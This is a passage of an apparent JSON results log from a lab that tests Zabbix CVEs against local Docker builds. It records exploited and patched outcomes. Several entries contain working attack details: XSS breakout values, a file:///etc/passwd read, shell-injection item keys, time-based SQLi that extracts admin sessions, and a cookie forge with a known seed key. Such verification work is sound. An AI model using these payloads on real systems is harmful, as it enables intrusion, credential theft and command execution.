+   "note": "Patched by range: 5.0.47 >= fix 5.0.21rc1 (affected max 5.0.18/5.0.20). Dry module builds the payload (605B) but never probes a sink; API still stores <script> name verbatim (storage != vuln, output escaping added by the fix). Not exploitable on this build per fixed range; no sink test possible (patched)."
+  },
+  {
+   "version": "5.0.5",
+   "result": "xss-executed (rce-leg blocked)",
+   "when": "2026-10-29",
+   "conditions": "Admin/zabbix; web 127.0.0.1:48317 (zabbix-web-nginx-pgsql:alpine-5.0.5); headless victim clicked Operations 'Add'",
+   "note": "Reflected XSS CVE-2022-24349. Sink from ZBX-20680/DEV-2077 fix (commit f8eb1de4e244, ui/actionconf.php: 'eventsource' flag null->P_SYS): raw eventsource reflected into onclick=\"operation_details.open(this,0,<eventsource>,<phase>)\" in ui/include/views/configuration.action.edit.php (3 Add buttons). Attack URL: /actionconf.php?form=create&eventsource=<js-expr>; trigger = click Add (payload is 3rd arg, async IIFE runs before open()). PROVEN: headless victim alert() showed 'Hi! It's a XSS from MN3STRASHN0' + ?v=1 beacon. RCE leg (script.create via victim session) BLOCKED as predicted: 5.0 api needs body auth=full sessionid; zbx_sessionid cookie HttpOnly (JS can't read); page's only token (sid CSRF input = last 16 hex of 32-hex sessionid) rejected by API: 'Session terminated, re-login, please.' Verified script.get with full sessionid works directly (attacker login). RE-RUN 2026-10-29 with FIXED xss.py helper (Object.assign {jsonrpc,method:m,id:1},p): script.create from victim session now returns clean 'Not authorised.' (proper JSON-RPC, method present) — proves the 5.x blocker is purely the missing body auth token (sessionid HttpOnly), NOT the (now fixed) helper bug. ?c= exfil shows only 'tab=1' (zbx_sessionid/z bx_session HttpOnly)."
+  },
+  {
+   "version": "5.4.8",
+   "result": "xss-executed (rce-leg blocked)",
+   "when": "2026-10-29",
+   "conditions": "Admin/zabbix; web 127.0.0.1:48605 (zabbix-web-nginx-pgsql:5.4.8-alpine); headless victim clicked Operations 'Add'",
+   "note": "Same reflected-XSS sink as 5.0.5 (actionconf.php eventsource flag null; onClick raw concat). PROVEN: alert 'Hi! It's a XSS from MN3STRASHN0' + ?v=1 beacon. RCE leg blocked: 5.4 api needs body auth=sessionid (zbx_session cookie HttpOnly); sid CSRF token (last 16 hex) -> 'Session terminated, re-login, please.' RE-RUN 2026-10-29 with FIXED xss.py helper (Object.assign {jsonrpc,method:m,id:1},p): script.create from victim session now returns clean 'Not authorised.' (proper JSON-RPC, method present) — proves the 5.x blocker is purely the missing body auth token (sessionid HttpOnly), NOT the (now fixed) helper bug. ?c= exfil shows only 'tab=1' (zbx_sessionid/z bx_session HttpOnly)."
+  }
+ ],
+ "CVE-2022-24917": [
+  {
+   "version": "5.0.5-alpine",
+   "result": "check-pass",
+   "when": "2026-10-28",
+   "conditions": "Admin; xss-mode dry",
+   "note": "Stored-XSS injection sink confirmed injectable (dry mode). Full chain (steal zbx_session -> script RCE) needs a victim browser."
+  },
+  {
+   "version": "5.0.5-alpine",
+   "result": "check-fail-reachability",
+   "when": "2026-10-29",
+   "note": "services page INT-validated params on 5.0.5 (service.edit/get no unescaped GET echo); serviceconf.php 404; fix (DEV-2077) targets 5.4 rework. Not headless-reachable via GET here."
+  },
+  {
+   "version": "5.0.5",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "Admin/zabbix; headless chromium victim; web 127.0.0.1:48317 (zabbix-web-nginx-pgsql:alpine-5.0.5)",
+   "note": "Probed the service configuration window (services.php form) on 5.0.5: name, parentname, children, times, new_service_time, parentid, serviceid, triggerid with JS/HTML breakout payloads ('\"><img src=x onerror=...>'). No sink on 5.0.5: parentid/serviceid/triggerid are T_ZBX_INT + DB_ID validated (string payloads dropped); name reflected in the service LIST as escaped link text (&quot;&gt;&lt;img...); children/times/new_service_time not reflected; services.php has NO uncheckTableRows call. Family fix commit: ZBX-20680 (first fixed 5.0.21rc1). Negative for the sink on this build (vulnerable per range 5.0.0-5.0.20)."
+  },
+  {
+   "version": "5.0.5",
+   "result": "check-pass",
+   "when": "2026-10-29",
+   "conditions": "Admin; xss-mode dry; web 127.0.0.1:48317",
+   "note": "Dry-mode payload built (605B). API storage sink verified: hostgroup.create name '<script>...' accepted && hostgroup.get returns it verbatim (input not sanitized on 5.0.5). Matches earlier 5.0.5-alpine entries; full chain (steal zbx_session -> script RCE) needs a victim browser."
+  },
+  {
+   "version": "5.0.47",
+   "result": "range-report",
+   "when": "2026-10-29",
+   "conditions": "Admin; xss-mode dry; web 127.0.0.1:47339",
+   "note": "Patched by range: 5.0.47 >= fix 5.0.21rc1 (affected max 5.0.18/5.0.20). Dry module builds the payload (605B) but never probes a sink; API still stores <script> name verbatim (storage != vuln, output escaping added by the fix). Not exploitable on this build per fixed range; no sink test possible (patched)."
+  }
+ ],
+ "CVE-2022-24918": [
+  {
+   "version": "5.0.5-alpine",
+   "result": "check-pass",
+   "when": "2026-10-28",
+   "conditions": "Admin; xss-mode dry",
+   "note": "Stored-XSS injection sink confirmed injectable (dry mode). Full chain (steal zbx_session -> script RCE) needs a victim browser."
+  },
+  {
+   "version": "5.0.5-alpine",
+   "result": "sink-identified",
+   "when": "2026-10-29",
+   "conditions": "source audit + live probe (items.php POST delete flow)",
+   "note": "items.php uncheckTableRows(getRequest('checkbox_hash')) — checkbox_hash is T_ZBX_STR with no validation; value embedded raw in insert_js('sessionStorage.removeItem(\"cb_items_<HASH>\")') (func.inc.php uncheckTableRows, fixed in 5.0.21 by json_encode key). POST delete flow (group_itemid[]+delete+checkbox_hash) is the trigger; not completed end-to-end this session. Driver flow staged in /tmp/zlab_xss/drive_xss.py."
+  },
+  {
+   "version": "5.0.5",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "Admin/zabbix; headless chromium victim; web 127.0.0.1:48317 (zabbix-web-nginx-pgsql:alpine-5.0.5)",
+   "note": "Sink verified end-to-end (POST delete flow). items.php: 'checkbox_hash' => T_ZBX_STR with NO validation; action=item.massdelete (or any mass action) -> uncheckTableRows(getRequest('checkbox_hash')) in include/func.inc.php -> insert_js('sessionStorage.removeItem(\"cb_items_<HASH>\")') raw-concats the param into JS (get_js wraps in <script>, no escaping). HASH='x\");<PAYLOAD>//' breaks out of the JS string; response HTML shows <script>sessionStorage.removeItem(\"cb_items_x\");<PAYLOAD>//\")</script> (raw bytes verified). Headless victim Admin submitted the crafted hidden form; injected JS executed in the victim session: callback beacon ?m='Hi! It's a XSS from MN3STRASHN0' fired (also with the UPDATED module build_payload from zabbix_big_project — beacon+fixed RPC helper). RCE leg (script.create/script.get verify) blocked token-only on 5.0.5: zbx_sessionid is HttpOnly -> document.cookie empty (?c= empty); 5.0 api_jsonrpc.php needs the body auth session token — script.create with no auth -> 'Not authorised.', with the page CSRF sid as auth -> 'Session terminated, re-login, please.' So XSS executes; script-RCE needs >=6.0 cookie-session API (out of 5.0.x scope). Fix: ZBX-20680 (5.0.21rc1/4.0.39rc1/5.4.11rc1/6.0.1rc1) — uncheckTableRows now json_encode($key); re-validated on PATCHED 5.0.47 (zlab 47339): same POST renders the payload escaped/inert (cb_items_x\\\");document.title=\\\"PWNED\\\";\\/\\/), no breakout."
+  },
+  {
+   "version": "5.0.5",
+   "result": "check-pass",
+   "when": "2026-10-29",
+   "conditions": "Admin; xss-mode dry; web 127.0.0.1:48317",
+   "note": "Dry-mode payload built (605B). API storage sink verified: hostgroup.create name '<script>...' accepted && hostgroup.get returns it verbatim (input not sanitized on 5.0.5). Matches earlier 5.0.5-alpine entries; full chain (steal zbx_session -> script RCE) needs a victim browser."
+  },
+  {
+   "version": "5.0.47",
+   "result": "range-report",
+   "when": "2026-10-29",
+   "conditions": "Admin; xss-mode dry; web 127.0.0.1:47339",
+   "note": "Patched by range: 5.0.47 >= fix 5.0.21rc1 (affected max 5.0.18/5.0.20). Dry module builds the payload (605B) but never probes a sink; API still stores <script> name verbatim (storage != vuln, output escaping added by the fix). Not exploitable on this build per fixed range; no sink test possible (patched)."
+  }
+ ],
+ "CVE-2022-24919": [
+  {
+   "version": "5.0.5-alpine",
+   "result": "check-pass",
+   "when": "2026-10-28",
+   "conditions": "Admin; xss-mode dry",
+   "note": "Stored-XSS injection sink confirmed injectable (dry mode). Full chain (steal zbx_session -> script RCE) needs a victim browser."
+  },
+  {
+   "version": "5.0.5-alpine",
+   "result": "check-fail-reachability",
+   "when": "2026-10-29",
+   "note": "graphs.php graphtype INT+IN validated, parent_discoveryid P_SYS+DB_ID — no unescaped GET reflection on 5.0.5 (verified with markers)."
+  },
+  {
+   "version": "5.0.5",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "Admin/zabbix; headless chromium victim; web 127.0.0.1:48317 (zabbix-web-nginx-pgsql:alpine-5.0.5)",
+   "note": "Probed the graph configuration window (graphs.php form + delete/massdelete) on 5.0.5: hostid, parent_discoveryid, group_graphid, graphid, name with JS/HTML breakout payloads. No sink on 5.0.5: hostid/parent_discoveryid/group_graphid/graphid are T_ZBX_INT + DB_ID validated (strings dropped, never reflected in the uncheckTableRows parent args, graphs.php:270-393); config-window name not raw-reflected. The 5.0.21-fixed uncheckTableRows json_encode($key) change is unreachable with strings on 5.0.5. Family fix commit: ZBX-20680 (first fixed 5.0.21rc1). Negative on this build (vulnerable per range 5.0.0-5.0.20)."
+  },
+  {
+   "version": "5.0.5",
+   "result": "check-pass",
+   "when": "2026-10-29",
+   "conditions": "Admin; xss-mode dry; web 127.0.0.1:48317",
+   "note": "Dry-mode payload built (605B). API storage sink verified: hostgroup.create name '<script>...' accepted && hostgroup.get returns it verbatim (input not sanitized on 5.0.5). Matches earlier 5.0.5-alpine entries; full chain (steal zbx_session -> script RCE) needs a victim browser."
+  },
+  {
+   "version": "5.0.47",
+   "result": "range-report",
+   "when": "2026-10-29",
+   "conditions": "Admin; xss-mode dry; web 127.0.0.1:47339",
+   "note": "Patched by range: 5.0.47 >= fix 5.0.21rc1 (affected max 5.0.18/5.0.20). Dry module builds the payload (605B) but never probes a sink; API still stores <script> name verbatim (storage != vuln, output escaping added by the fix). Not exploitable on this build per fixed range; no sink test possible (patched)."
+  }
+ ],
+ "CVE-2022-46768": [
+  {
+   "version": "6.0.11-alpine",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "web-service container, AllowedIP open, seccomp=unconfined (chrome)",
+   "note": "POST /report {'url':'file:///etc/passwd','parameters':{w,h}} -> 200 application/pdf (%PDF-1.4, Chromium) — arbitrary file read from the web-service host confirmed live (zabbix/zabbix-web-service:6.0.11-alpine)."
+  },
+  {
+   "version": "6.0.27-alpine",
+   "result": "negative",
+   "when": "2026-10-28",
+   "conditions": "same probe",
+   "note": "400 'Unexpected URL scheme: file' — patched detection verified (fix 6.0.12rc1+)."
+  }
+ ],
+ "CVE-2023-29450": [
+  {
+   "version": "6.0.27-alpine",
+   "result": "negative",
+   "when": "2026-10-28",
+   "conditions": "Admin, item type 5 internal + JS step type 21",
+   "note": "created internal item with HttpRequest.get('file:///etc/passwd'); lastvalue = boottime value only, no file content — CURLOPT_PROTOCOLS block verified (actual code fix at 6.0.14). Positive repro needs server <6.0.14/5.0.32/6.2.8."
+  },
+  {
+   "version": "6.2.9-alpine",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "default creds; --file /etc/passwd",
+   "note": "Patched-detection: item preprocessing 'Error: cannot get URL: Unsupported protocol.' - CURLOPT_PROTOCOLS blocks file:// (fix >=6.0.14/6.2.8). No file content read. Positive patched-detection on 6.2.9."
+  },
+  {
+   "version": "5.0.5",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "Admin (или юзер с read-write на host group), server 5.0.5 (<5.0.32 уязвим)",
+   "note": "JS preprocessing file read через внутренний item (type 5) + JS-шаг (type 21): на 5.0 глобал движка называется CurlHttpRequest с методами в CamelCase (Get), а не HttpRequest.get (6.0+); value_type=1 — иначе контент уходит в error поля (numeric conversion). lastvalue = содержимое /etc/passwd (root:x:0:0:...). Константы 5/21 верны для 5.0; прежняя гипотеза 'другая константа' неверна — отличалось имя JS-глобала. Патч: 5.0.32/6.0.14 CURLOPT_PROTOCOLS."
+  }
+ ],
+ "CVE-2023-32727": [
+  {
+   "version": "5.0.5-alpine",
+   "result": "not-implemented",
+   "when": "2026-10-28",
+   "conditions": "Admin; 5.0.5 in affected range (5.0.0-5.0.38)",
+   "note": "Module is a stub: run() returns ok:False with 'реализуйте пробу на unpatched-стеке' — no actual icmpping cmd-injection probe implemented."
+  },
+  {
+   "version": "5.0.5",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "Admin/zabbix on shared lab 127.0.0.1:48317 (zabbix-server-pgsql:alpine-5.0.5); pinger enabled (StartPingers=1); fping 4.2 present; item.create rights",
+   "note": "Oracle: item type 3 'Simple check' key icmpping[<ip>;sleep N;,1] (count=1 so the injected item is the pinger's first host -> interval-detection executes it via /bin/sh -c). Vulnerable 5.0.5: the server shell-runs 'fping -c1 -t50 -i<ms> <target>' (zbxicmpping get_interval_option -> zbx_execute), payload killed by the 1s exec timeout -> item error 'Timeout while executing \"/usr/sbin/fping ... <payload>\"' (control: patched >=5.0.39 rejects with 'Invalid host name or IP address' via zbx_validate_hostname). PROOF on 48317: item error 'Timeout while executing \"/usr/sbin/fping -c1 -t50 -i0 127.0.0.1;sleep 3;\"' time_to_outcome 29.7s; server log shows 'Failed to execute command ... 127.0.0.1;touch /tmp/zbx32727_223386;sleep 3;' and the file /tmp/zbx32727_223386 was created on the server (uid zabbix) = arbitrary command execution. Also reproduced on a private alpine-5.0.5 stack with marker /tmp/zbx5inj_side_1793222772. Caveat: if the pinger interval-detection cache is warm (1h), the payload goes to the fping host file only (item 'fping failed:' / supported 0) -> module returns check-pass; verified with ssh-like pinger restart. Command runs as user 'zabbix' on the server."
+  },
+  {
+   "version": "5.0.47",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "Admin/zabbix; web 127.0.0.1:47339; server recreated with ZBX_STARTPINGERS=1 (pinger running)",
+   "note": "PATCHED-DETECTION recorded: item icmpping[127.0.0.1;sleep 3;,1] (type 3) collected -> error 'Cannot execute \"/usr/sbin/fping -c1 -t50 -i0\": Invalid host name or IP address' = the >=5.0.39 fix (zbx_validate_hostname in get_fping_out); time_to_outcome 46.5s. Contrast 5.0.5 entry (exploited, 'Timeout while executing ... <payload>') recorded 2026-10-29."
+  }
+ ],
+ "CVE-2023-32728": [
+  {
+   "version": "5.0.46-alpine agent2",
+   "result": "check-pass",
+   "when": "2026-10-28",
+   "conditions": "own agent2 container, raw passive protocol; smart.disk.get[device,mode]",
+   "note": "Arg-injection primitive confirmed: marker ZBXINJECT2334 lands verbatim in the smartctl argv. RCE flavor (5.0.0-5.0.39) needs a shell-backed build; 5.0.46 is past the RCE window."
+  },
+  {
+   "version": "5.0.30-alpine agent2 (shell-backed lab)",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "real stock docker image zabbix/zabbix-agent2:5.0.30-alpine (pristine 5.0.30, git revision 2c96c38 == tag 5.0.30, compiled Nov 28 2022) run as zlab_agent2_shellback, port 127.0.0.1:44688, passive allowlist Server=0.0.0.0/0 (ZBX_SERVER_HOST env); no mock: the stock build IS the vulnerable shell-backed agent (src/go/plugins/smart/smart_nix.go: executable := fmt.Sprintf(\"sudo -n %s %s\", path, args); zbxcmd_nix.go: exec.Command(\"sh\",\"-c\",s); params concatenated verbatim, no sanitization on 5.0.30). Command executed as uid=1997(zabbix) inside the agent container. Module zbxscan -m active -t 127.0.0.1 -exp CVE-2023-32728 --agent-port 44688 --cmd 'touch /tmp/zbx32728_rce; touch /tmp/zbx32728_rce_$(id -u)'",
+   "note": "One-shot ';cmd;#' injection: smart.disk.get[\"sda;touch /tmp/zbx32728_rce; touch /tmp/zbx32728_rce_$(id -u);#\"] -> sh -c 'sudo -n smartctl -a sda;touch ...;touch ..._$(id -u);# -j'. MARKERS CREATED inside the agent container: /tmp/zbx32728_rce and /tmp/zbx32728_rce_1997 (stat uid=1997 owner=zabbix), so $(id -u) subshells also executed. Response body is the smartctl JSON-parse failure (not command output) - execution proof is the marker side-effect. Stock exec-array builds (7.x, 5.0.47+) are argv-only: the same param lands in exec.CommandContext argv, no shell, no RCE."
+  }
+ ],
+ "CVE-2024-22116": [
+  {
+   "version": "7.0.0-alpine",
+   "result": "negative",
+   "when": "2026-10-28",
+   "conditions": "Admin, host.update interface DNS",
+   "note": "interface DNS with shell meta-chars rejected by validation ('Incorrect interface DNS parameter') — the fix (7.0.0rc3); vulnerable builds (7.0.0a1-rc2, 6.4.9-6.4.15) accept and execute Ping on server. Positive repro needs a 7.0.0rc2/6.4.15 image (unavailable)."
+  },
+  {
+   "version": "6.4.15-ubuntu (self-built docker stack, MySQL 8.0)",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "Admin; vulnerable 6.4.15 (фикс 6.4.16rc1/7.0.0rc3); Ping script default",
+   "note": "RCE подтверждён на 6.4.15: реальный вектор = user macro в interface DNS — фронтенд 6.4.15 валидирует DNS (метасимволы напрямую не проходят), НО допускает {\\$MACRO}; макрос-значение с шелл-метасимволами попадает в {HOST.CONN} при server-side подстановке без экранирования -> `ping -c 3 127.0.0.2;echo MKZ<ts>;true; case...` — маркер в выводе script.execute (command injection, CWE-94). Требуется ~60-75s синхронизации server config cache после host.update. Прямая DNS-инъекция работает только на 7.0.0a1-rc2 (валидации нет). Модуль обновлён: direct -> macro fallback + config-sync wait."
+  }
+ ],
+ "CVE-2024-22120": [
+  {
+   "version": "6.0.27-alpine",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "default creds Admin/zabbix; trapper 10051 (mapped); PostgreSQL backend",
+   "note": "Blind time-based SQLi via trapper audit clientip verified live E2E -> RCE. Dual-time hex oracle (match: pg_sleep(2) else pg_sleep(0.6), ASCII equality, hex alphabet 0123456789abcdef), cross-checked against W01fh4cker/CVE-2024-22120-RCE and reporter PoC (support#236280) — identical. Extracted config.session_key (pos-1 byte flaked '1' vs 'd'; rest byte-exact to DB) and a real Super Admin sessionid 82ca9c81fb29777ef87471448281aac2 (verified in sessions, userid=1, status=0). script.create (super-admin only) accepted; script.execute returned uid=1997(zabbix) gid=1995(zabbix) on the 6.0.27 server. Full chain trapper SQLi -> admin session -> script RCE proven live. Cookie-forge mechanics (HMAC-SHA256(session_key, compact json)) validated separately; not required for the API-session RCE."
+  },
+  {
+   "version": "6.0.27-alpine (mysql:8.0.46)",
+   "result": "check-pass",
+   "when": "2026-10-29",
+   "conditions": "MySQL 8.0.46 backend, own docker network zbxmysql_627; trapper audit clientip INSERT context; Admin/zabbix",
+   "note": "MySQL payload fixed: '1'+(IF(cond,SLEEP(2.0),SLEEP(0.6)))+'x' errored [Z3005] ERROR 1292 'Truncated incorrect DOUBLE value: x' in the auditlog VALUES literal (strict-mode numeric coercion) making probes fail. New payload '1'+(IF(cond,SLEEP(2.0),SLEEP(0.6)))+'0' verified at DB level in the real auditlog INSERT: TRUE branch 2.0s, FALSE branch 0.6s, row written cleanly (ip='1'), no error — dual-time oracle works on MySQL 8.0. Full 6.0.27 scan (session_key+sessionid hex extraction) stopped by direction (was ~42min at pos ~10 pre-fix; PG full chain already exploited in earlier runs, see existing 6.0.27/7.0.0 PG entries). Also fixed missing resolve_cmd import in trapper.py (module crashed at startup)."
+  }
+ ],
+ "CVE-2024-22121": [
+  {
+   "version": "7.0.0-alpine",
+   "result": "negative",
+   "when": "2026-10-28",
+   "conditions": "low user; agent-config methods",
+   "note": "Blackbox: methods reachable by a low user are not role-blocked (potential contour), but the full vector is not published and no deterministic E2E lab exists."
+  },
+  {
+   "version": "any (Windows Agent MSI)",
+   "result": "check-pass",
+   "when": "2026-10-29",
+   "conditions": "Windows хоста с Zabbix Agent, установленным per-machine; вектор LOCAL",
+   "note": "CVE-2024-22121 = ZBX-25011 'Zabbix Agent MSI Installer Allows Non-Admin User To Access Change Option via msiexec.exe' (CWE-281, CAPEC-180, CVSS 6.1 AV:L) — Windows-only локальный вектор: не-админ запускает msiexec.exe /i <agent-msi> и получает Change-опцию без прав, удаляя/меняя функции агента (Zabbix Agent Service). Это НЕ серверный/веб-API вектор — прежний blackbox-модуль проверял не ту поверхность. E2E-лаборатория на Linux невозможна (Windows local); уязвимые/исправленные MSI (6.4.15 vs 6.4.16) скачиваемы с cdn.zabbix.com. Модуль переписан на честный check-pass с точным observable; фикс 5.0.43rc1/6.0.31rc1/6.4.16rc1/7.0.0rc3."
+  }
+ ],
+ "CVE-2024-36460": [
+  {
+   "version": "7.0.0-alpine",
+   "result": "check-pass",
+   "when": "2026-10-28",
+   "conditions": "Admin",
+   "note": "auditlog.get exists on 7.0 and returns records matching 'passwd' (3 rows) — plaintext-password audit exposure surface confirmed. Module CVE-2024-36460 (leak-detect)."
+  },
+  {
+   "version": "6.0.27-alpine",
+   "result": "check-pass",
+   "when": "2026-10-29",
+   "conditions": "default creds",
+   "note": "auditlog.get search details='passwd' returns records (user.passwd add entry), but value masked '******'. Detector hits; no plaintext password actually exposed in this build."
+  },
+  {
+   "version": "6.0.31-alpine",
+   "result": "check-pass",
+   "when": "2026-10-29",
+   "conditions": "default creds",
+   "note": "auditlog.get returns user.passwd audit row (masked ******). Same masked behavior."
+  },
+  {
+   "version": "6.4.21-alpine",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "default creds",
+   "note": "auditlog.get found no passwd audit records. Patched (fix 6.4.15)."
+  },
+  {
+   "version": "7.0.0-alpine",
+   "result": "check-pass",
+   "when": "2026-10-29",
+   "conditions": "Admin",
+   "note": "auditlog.get exists on 7.0 and returns records matching 'passwd' (sample shows user.passwd in details of user.create api call). Plaintext-password audit exposure surface confirmed."
+  }
+ ],
+ "CVE-2024-36464": [
+  {
+   "version": "7.0.0-alpine",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "Admin; mediatype Email with passwd set",
+   "note": "Detector verified live: mediatype.get(output extend) returns 'passwd' in cleartext (value_head SecretP@ss12…) — the export/YAML exposure surface confirmed. Module CVE-2024-36464 (leak-detect)."
+  },
+  {
+   "version": "6.0.27-alpine",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "default creds Admin",
+   "note": "mediatype.get output extend: 35 mediatypes returned, no secret fields (passwd/password/secret/token) populated in fresh install -> no leak observed here."
+  },
+  {
+   "version": "6.0.31-alpine",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "default creds Admin",
+   "note": "mediatype.get: 35 mediatypes, no populated secret fields. 6.0.31 > fixed 6.0.30rc1 -> patched."
+  },
+  {
+   "version": "6.0.49-alpine",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "default creds Admin",
+   "note": "mediatype.get: 36 mediatypes, no secret fields returned. Patched (fix 6.0.30rc1)."
+  },
+  {
+   "version": "6.4.21-alpine",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "default creds Admin",
+   "note": "mediatype.get: 39 mediatypes, no secret fields. Patched (fix 6.4.15rc1)."
+  },
+  {
+   "version": "7.0.0-alpine",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "Admin; mediatype Email with passwd set via mediatype.update (smtp_authentication=1)",
+   "note": "mediatype.get(output extend) returns 'passwd' in cleartext (value_head SecretP@ss12) — media-type secret exposure surface confirmed (detector ok=True, 39 mediatypes)."
+  }
+ ],
+ "CVE-2024-36465": [
+  {
+   "version": "7.0.0-alpine",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "role User account (zbxlow…), PostgreSQL backend",
+   "note": "Time-based SQLi via API groupBy (CApiService): groupBy entry 'userid,(CASE WHEN … THEN pg_sleep ELSE NULL END)' evaluated per row. low user -> extracted Super Admin sessionid from sessions (userid=1) -> script.create probe (super-admin only) -> script_rce -> uid=1997(zabbix). Full chain verified live (7.0.0, no public PoC)."
+  },
+  {
+   "version": "6.0.31-alpine",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "default creds",
+   "note": "groupBy SQLi attempt: extraction yielded non-Super-Admin session ('extracted session is not Super Admin'), error 'Session terminated'. 6.x not in affected range (vulns.json: 7.0.0..7.0.8rc1 / 7.2 only) -> range-report/negative."
+  },
+  {
+   "version": "6.4.21-alpine",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "default creds",
+   "note": "groupBy SQLi: non-Super-Admin session (mysql flavor), no escalation. 6.4 not in affected range for 36465 -> range-report/negative."
+  },
+  {
+   "version": "7.0.0-alpine",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "Admin; time-based SQLi groupBy -> Super Admin session -> script_rce --cmd 'id'",
+   "note": "Full chain exploited on fresh 7.0.0: groupBy SQLi extracted Admin session, super_admin_probe OK (scriptids 5), script.execute returned uid=1997(zabbix). RCE confirmed (CVE-2024-36465)."
+  },
+  {
+   "version": "7.0.0-alpine (mysql:8.0.46)",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "MySQL 8.0.46 backend, own docker network zbxmysql_700; Admin/zabbix",
+   "note": "groupBy (CApiService) time-based oracle on MySQL: groupBy ['userid,(IF(1=1,SLEEP(2),0))'] = 4.05s vs control 0.07s (SLEEP in GROUP BY evaluates ~2x per group). Extracted Super Admin session c710ba7660c27ce2bfa43c6b436656e5 from sessions(userid=1); super_admin_probe OK (scriptids ['4']); ok:True. Flavor auto-detected (pg_sleep groupBy inert on MySQL)."
+  }
+ ],
+ "CVE-2024-36466": [
+  {
+   "version": "7.0.0-alpine",
+   "result": "negative",
+   "when": "2026-10-28",
+   "conditions": "Admin; forged zbx_session cookie",
+   "note": "Cookie signature validated strictly (no 'Sign out' variant reached) — bypass not achieved without guest/SAML-specific conditions on this config."
+  },
+  {
+   "version": "7.4.2-alpine",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "Admin/zabbix; forged zbx_session cookie using the public 7.4 seed key",
+   "note": "7.4 cookie canonical = base64(json {sessionid, sign}) where sign = HMAC-SHA256(seed_key, php-json compact of {\"sessionid\": sid}) — NO serverCheckResult/serverCheckTime fields on 7.4 (they existed <7.4). The 7.4.2 seed session_key is the public default 0e1e3fb9846cbe4e079a22d38b2db33e (settings.session_key). Forging a cookie for a login-obtained sessionid is ACCEPTED by the frontend ('Sign out' present, http 200). Module Cve202436466 ok:True with --seed-key explicit or --seed-key auto (reads key from DB, PGSQL/MYSQL auto-probe)."
+  },
+  {
+   "version": "7.0.0-alpine",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "Admin/zabbix; forged zbx_session cookie with public 7.4 seed key",
+   "note": "Cookie forge attempt on 7.0.0 with seed key 0e1e3fb9...: forged cookie rejected ('sign out' absent) — 7.0 uses <7.4 canonical with serverCheckResult/Time and a different secret; seed key not the 7.4 public one. Not reproducible on 7.0.0 (matches earlier record)."
+  },
+  {
+   "version": "7.4.2-alpine",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "Admin/zabbix; forged zbx_session cookie with seed key 0e1e3fb9846cbe4e079a22d38b2db33e",
+   "note": "Forged cookie accepted on 7.4.2 (forged_canonical 7.4+ {sessionid,sign}, 'sign out' present) — session authenticated with attacker-known seed key. CVE-2024-36466 confirmed live on 7.4.2."
+  },
+  {
+   "version": "7.4.16-alpine",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "Admin/zabbix; forged zbx_session cookie with seed key 0e1e3fb9846cbe4e079a22d38b2db33e",
+   "note": "Cookie forge on patched 7.4.16 rejected ('sign out' absent) — patched as expected."
+  }
+ ],
+ "CVE-2024-36467": [
+  {
+   "version": "7.0.0-alpine",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "low user (role User, group Guests) created then abused as attacker",
+   "note": "user.update added the low user to 'Zabbix administrators' (usrgrpid 7) — verified via user.get selectUsrgrps. Privesc chain confirmed live (zabbix-server-pgsql:7.0.0-alpine); 7.0 renamed API to usergroup.get."
+  },
+  {
+   "version": "6.0.27-alpine",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "default creds; verification-mode low user zbxlow*",
+   "note": "user.update usrgrps escalation: low User-role account joins 'Zabbix administrators' group (usrgrpid 7) -> read/write all hosts + admin GUI. Fix is 6.0.33rc1."
+  },
+  {
+   "version": "6.0.31-alpine",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "default creds; verification-mode low user",
+   "note": "Same privesc: low user joins usrgrpid 7 'Zabbix administrators'. 6.0.31 > fixed? no: 6.0.31 < 6.0.33rc1 -> still vulnerable. Confirmed."
+  },
+  {
+   "version": "6.0.49-alpine",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "default creds",
+   "note": "Patched: user.update blocks with 'Only Super admin users can update \"usrgrps\" parameter.' (fix 6.0.33rc1). Positive patched-detection."
+  },
+  {
+   "version": "6.4.21-alpine",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "default creds",
+   "note": "Patched: user.update usrgrps refused 'Only Super admin users...' (fix 6.4.18rc1). Positive patched-detection."
+  },
+  {
+   "version": "5.0.5",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "low user zbxlow* (Guests) created as attacker (module Admin-verification mode unusable on 5.0: role.get not implemented -> run with --user <low>); web 127.0.0.1:48317",
+   "note": "user.update(self userid, usrgrps=[usrgrpid 7 'Zabbix administrators']) accepted -> user.get selectUsrgrps shows joined; privesc confirmed (module ok:True joined_groups=[{'usrgrpid':'7','name':'Zabbix administrators'}]). Also manual API probe: 'groups after: [Zabbix administrators]', VERDICT ESCALATED. 5.0 branch affected per DB (5.0.0-5.0.43rc1 exclusive)."
+  },
+  {
+   "version": "5.0.47",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "low user zbxlow* (Guests); web 127.0.0.1:47339",
